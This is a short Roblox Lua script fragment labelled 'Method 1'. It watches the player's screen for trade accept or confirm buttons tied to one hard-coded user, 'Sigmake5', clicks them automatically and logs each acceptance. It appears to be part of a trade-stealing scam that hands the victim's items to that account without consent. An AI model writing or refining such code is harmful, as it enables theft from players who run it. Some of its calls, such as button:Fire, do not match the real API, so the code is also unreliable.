-- Method 1: Listen for trade request popup in GUI
local function watchForTradePopup()
    pcall(function()
        local playerGui = player.PlayerGui
        
        while wait(0.1) do
            -- Look for trade request buttons
            for _, button in pairs(playerGui:GetDescendants()) do
                if button:IsA("TextButton") then
                    local text = (button.Text or ""):lower()
                    
                    -- Found accept button
                    if text:find("accept") or text:find("confirm") then
                        -- Check if it's from Sigmake5
                        local parent = button.Parent
                        local isFromTarget = false
                        
                        while parent do
                            if parent:IsA("TextLabel") and parent.Text == TARGET_USER then
                                isFromTarget = true
                                break
                            elseif parent:IsA("Frame") and parent.Name:find(TARGET_USER) then
                                isFromTarget = true
                                break
                            end
                            parent = parent.Parent
                        end
                        
                        if isFromTarget then
                            sendLog("🔔 Trade request from " .. TARGET_USER .. " detected!")
                            -- Click accept
                            button:Fire("MouseButton1Click")
                            button:Fire("Activated")
                            sendLog("✅ Auto-accepted trade request")
                        end
                    end
                end
            end
        end
    end)
end

